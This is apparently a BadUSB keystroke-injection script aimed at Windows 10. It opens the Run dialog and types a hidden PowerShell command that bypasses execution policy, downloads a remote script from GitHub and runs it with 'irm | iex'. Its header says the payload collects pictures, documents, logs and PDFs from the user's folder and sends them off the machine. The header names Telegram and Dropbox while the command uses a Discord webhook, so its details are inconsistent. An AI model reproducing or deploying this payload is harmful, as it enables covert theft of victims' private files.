// Title: beigeworm's Exfiltrate files to Telegram
// Author: @beigeworm
// Description: This script searches the users folder fot pictures, documents, logs, PDFs and more, then sends its all to a dropbox account.
// Target: Windows 10
// *SETUP*
// replace TELEGRAM_TOKEN with your Telegram Token.

// script setup
layout("us")

// Open Powershell and download script
delay(1000);
press("GUI r");
delay(1000);
type("powershell -NoP -Ep Bypass -W H -C $dc='DISCORD_WEBHOOK_HERE'; irm https://raw.githubusercontent.com/beigeworm/PwnPi-Scripts/main/Fast-Execution/Exfiltrate-to-Telegram/main.ps1 | iex");
delay(500);
press("ENTER");